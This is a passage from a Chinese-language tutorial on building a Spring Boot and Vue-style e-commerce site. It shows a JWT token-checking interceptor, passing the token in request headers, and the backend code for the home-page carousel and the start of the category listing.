punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//解析token的SigningKey必须和生成token时设置密码一致</span>                parser<span class="token punctuation">.</span><span class="token function">setSigningKey</span><span class="token punctuation">(</span><span class="token string">"QIANfeng6666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">//如果token正确（密码正确，有效期内）则正常执行，否则抛出异常</span>                <span class="token class-name">Jws</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Claims</span><span class="token punctuation">&gt;</span></span> claimsJws <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseClaimsJws</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ExpiredJwtException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span> <span class="token string">"登录过期，请重新登录！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">doResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnsupportedJwtException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span> <span class="token string">"Token不合法，请自重！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">doResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span> <span class="token string">"请先登录！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">doResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">doResponse</span><span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span><span class="token class-name">ResultVO</span> resultVO<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置拦截器</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InterceptorConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">CheckTokenInterceptor</span> checkTokenInterceptor<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span><span class="token class-name">InterceptorRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">{</span>        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span>checkTokenInterceptor<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">excludePathPatterns</span><span class="token punctuation">(</span><span class="token string">"/user/**"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="7-5-请求头传递token"><a href="#7-5-请求头传递token" class="headerlink" title="7.5 请求头传递token"></a>7.5 请求头传递token</h4><blockquote><p>前端但凡访问受限资源，都必须携带token发送请求；token可以通过请求行(params)、请求头（header）以及请求体（data）传递，但是习惯性使用header传递</p></blockquote><h6 id="7-5-1-axios通过请求头传值"><a href="#7-5-1-axios通过请求头传值" class="headerlink" title="7.5.1 axios通过请求头传值"></a>7.5.1 axios通过请求头传值</h6><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">axios</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    method<span class="token operator">:</span><span class="token string">"get"</span><span class="token punctuation">,</span>    url<span class="token operator">:</span>baseUrl<span class="token operator">+</span><span class="token string">"shopcart/list"</span><span class="token punctuation">,</span>    headers<span class="token operator">:</span><span class="token punctuation">{</span>        token<span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>token    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-5-2-在拦截器中放行options请求"><a href="#7-5-2-在拦截器中放行options请求" class="headerlink" title="7.5.2 在拦截器中放行options请求"></a>7.5.2 在拦截器中放行options请求</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CheckTokenInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token comment">//放行options请求</span>        <span class="token class-name">String</span> method <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"OPTIONS"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">String</span> token <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------------"</span><span class="token operator">+</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span> <span class="token string">"请先登录！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//提示请先登录</span>            <span class="token function">doResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token comment">//验证token</span>                <span class="token class-name">JwtParser</span> parser <span class="token operator">=</span> <span class="token class-name">Jwts</span><span class="token punctuation">.</span><span class="token function">parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//解析token的SigningKey必须和生成token时设置密码一致</span>                parser<span class="token punctuation">.</span><span class="token function">setSigningKey</span><span class="token punctuation">(</span><span class="token string">"QIANfeng6666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">//如果token正确（密码正确，有效期内）则正常执行，否则抛出异常</span>                <span class="token class-name">Jws</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Claims</span><span class="token punctuation">&gt;</span></span> claimsJws <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseClaimsJws</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ExpiredJwtException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span> <span class="token string">"登录过期，请重新登录！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">doResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnsupportedJwtException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span> <span class="token string">"Token不合法，请自重！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">doResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span> <span class="token string">"请先登录！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">doResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>   <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">doResponse</span><span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span><span class="token class-name">ResultVO</span> resultVO<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>resultVO<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="八、首页—轮播图"><a href="#八、首页—轮播图" class="headerlink" title="八、首页—轮播图"></a>八、首页—轮播图</h2><h4 id="8-1-实现流程分析"><a href="#8-1-实现流程分析" class="headerlink" title="8.1 实现流程分析"></a>8.1 实现流程分析</h4><ul><li><p>流程图</p><p><img src="imgs/1619313449243.png" alt="1619313449243"></p></li><li><p>接口</p><ul><li>查询轮播图信息返回</li></ul></li></ul><h4 id="8-2-完成后台接口开发"><a href="#8-2-完成后台接口开发" class="headerlink" title="8.2 完成后台接口开发"></a>8.2 完成后台接口开发</h4><h6 id="8-2-1-数据库操作实现"><a href="#8-2-1-数据库操作实现" class="headerlink" title="8.2.1 数据库操作实现"></a>8.2.1 数据库操作实现</h6><ul><li>分析数据表结构</li></ul><p><img src="imgs/1619314094094.png" alt="1619314094094"></p><ul><li>添加测试数据</li></ul><p><img src="imgs/1619314628075.png" alt="1619314628075"></p><ul><li>编写sql语句</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> img_id<span class="token punctuation">,</span>       img_url<span class="token punctuation">,</span>       img_bg_color<span class="token punctuation">,</span>       prod_id<span class="token punctuation">,</span>       category_id<span class="token punctuation">,</span>       index_type<span class="token punctuation">,</span>       seq<span class="token punctuation">,</span>       <span class="token keyword">status</span><span class="token punctuation">,</span>       create_time<span class="token punctuation">,</span>       update_time<span class="token keyword">from</span> index_img<span class="token keyword">where</span> <span class="token keyword">status</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">order</span> <span class="token keyword">by</span> seq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在Mapper接口（DAO）中定义操作方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IndexImgMapper</span> <span class="token keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">IndexImg</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token comment">//1.查询轮播图信息： 查询status=1 且 按照seq进行排序</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">IndexImg</span><span class="token punctuation">&gt;</span></span> <span class="token function">listIndexImgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>配置映射文件</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--BaseResultMap是由逆向工程生成的--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>listIndexImgs<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    select img_id,           img_url,           img_bg_color,           prod_id,           category_id,           index_type,           seq,           status,           create_time,           update_time    from index_img    where status=1    order by seq  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="8-2-2-业务层实现"><a href="#8-2-2-业务层实现" class="headerlink" title="8.2.2 业务层实现"></a>8.2.2 业务层实现</h6><ul><li>IndexImgService接口</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IndexImgService</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listIndexImgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>IndexImgServiceImpl实现类</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexImgServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">IndexImgService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">IndexImgMapper</span> indexImgMapper<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listIndexImgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">IndexImg</span><span class="token punctuation">&gt;</span></span> indexImgs <span class="token operator">=</span> indexImgMapper<span class="token punctuation">.</span><span class="token function">listIndexImgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>indexImgs<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"fail"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span><span class="token string">"success"</span><span class="token punctuation">,</span>indexImgs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="8-2-3-控制层实现"><a href="#8-2-3-控制层实现" class="headerlink" title="8.2.3 控制层实现"></a>8.2.3 控制层实现</h6><ul><li>IndexController类</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@CrossOrigin</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/index"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"提供首页数据显示所需的接口"</span><span class="token punctuation">,</span>tags <span class="token operator">=</span> <span class="token string">"首页管理"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">IndexImgService</span> indexImgService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/indeximg"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"首页轮播图接口"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listIndexImgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> indexImgService<span class="token punctuation">.</span><span class="token function">listIndexImgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-3-完成前端功能"><a href="#8-3-完成前端功能" class="headerlink" title="8.3 完成前端功能"></a>8.3 完成前端功能</h4><blockquote><p>当进入到index.html，在进行页面初始化之后，就需要请求轮播图数据进行轮播图的显示</p></blockquote><table><thead><tr><th>index.html</th></tr></thead><tbody><tr><td><img src="imgs/1619317642004.png" alt="1619317642004"></td></tr><tr><td><img src="imgs/1619317601353.png" alt="1619317601353"></td></tr></tbody></table><h2 id="九、首页-分类列表"><a href="#九、首页-分类列表" class="headerlink" title="九、首页-分类列表"></a>九、首页-分类列表</h2><h4 id="9-1-实现流程分析"><a href="#9-1-实现流程分析" class="headerlink" title="9.1 实现流程分析"></a>9.1 实现流程分析</h4><p><img src="imgs/1619320450656.png" alt="1619320450656"></p><ul><li><p>方案一：一次性查询三级分类</p><ul><li>优点：只需要一次查询，根据一级分类显示二级分类时响应速度较快</li><li>缺点：数据库查询效率较低，页面首次加载的速度也相对较慢</li></ul></li><li><p>方案二：先只查询一级分类，用户点击/鼠标移动到一级分类，动态加载二级分类</p><ul><li>优点：数据库查询效率提高，页面首次加载速度提高</li><li>缺点：需要多次连接数据库</li></ul></li></ul><h4 id="9-2-接口开发"><a href="#9-2-接口开发" class="headerlink" title="9.2 接口开发"></a>9.2 接口开发</h4><h6 id="9-2-1-数据库操作实现"><a href="#9-2-1-数据库操作实现" class="headerlink" title="9.2.1 数据库操作实现"></a>9.2.1 数据库操作实现</h6><ul><li>数据表结构</li></ul><p><img src="imgs/1619321256900.png" alt="1619321256900"></p><ul><li><p>添加测试数据</p></li><li><p>编写接口实现所需的SQL</p><ul><li>连接查询</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c1<span class="token punctuation">.</span>category_id <span class="token string">'category_id1'</span><span class="token punctuation">,</span>c1<span class="token punctuation">.</span>category_name <span class="token string">'category_name1'</span><span class="token punctuation">,</span>c1<span class="token punctuation">.</span>category_level <span class="token string">'category_level1'</span><span class="token punctuation">,</span>c1<span class="token punctuation">.</span>parent_id <span class="token string">'parent_id1'</span><span class="token punctuation">,</span>c1<span class="token punctuation">.</span>category_icon <span class="token string">'category_icon1'</span><span class="token punctuation">,</span>c1<span class="token punctuation">.</span>category_slogan <span class="token string">'category_slogan1'</span><span class="token punctuation">,</span>c1<span class="token punctuation">.</span>category_pic <span class="token string">'category_pic1'</span><span class="token punctuation">,</span>c1<span class="token punctuation">.</span>category_bg_color <span class="token string">'category_bg_color1'</span><span class="token punctuation">,</span>c2<span class="token punctuation">.</span>category_id <span class="token string">'category_id2'</span><span class="token punctuation">,</span>c2<span class="token punctuation">.</span>category_name <span class="token string">'category_name2'</span><span class="token punctuation">,</span>c2<span class="token punctuation">.</span>category_level <span class="token string">'category_level2'</span><span class="token punctuation">,</span>c2<span class="token punctuation">.</span>parent_id <span class="token string">'parent_id2'</span><span class="token punctuation">,</span>c3<span class="token punctuation">.</span>category_id <span class="token string">'category_id3'</span><span class="token punctuation">,</span>c3<span class="token punctuation">.</span>category_name <span class="token string">'category_name3'</span><span class="token punctuation">,</span>c3<span class="token punctuation">.</span>category_level <span class="token string">'category_level3'</span><span class="token punctuation">,</span>c3<span class="token punctuation">.</span>parent_id <span class="token string">'parent_id3'</span><span class="token keyword">from</span> category c1 <span class="token keyword">inner</span> <span class="token keyword">join</span> category c2 <span class="token keyword">on</span> c2<span class="token punctuation">.</span>parent_id<span class="token operator">=</span>c1<span class="token punctuation">.</span>category_id<span class="token keyword">left</span> <span class="token keyword">join</span> category c3<span class="token keyword">on</span> c3<span class="token punctuation">.</span>parent_id<span class="token operator">=</span>c2<span class="token punctuation">.</span>category_id<span class="token keyword">where</span> c1<span class="token punctuation">.</span>category_level<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>子查询</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 根据父级分类的id查询类别信息</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> category <span class="token keyword">where</span> parent_id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>创建用于封装查询的类别信息的CategoryVO</p><p><code>在beans子工程的entity包新建一个CategoryVO用于封装查询到类别信息，相对于Category来说，新增了如下属性：</code></p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">public class CategoryVO {    //用于存放当前分类的子分类    private List&lt;CategoryVO&gt; categories;    public List&lt;CategoryVO&gt; getCategories() {        return categories;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在CategoryMapper定义操作方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">CategoryMapper</span> <span class="token 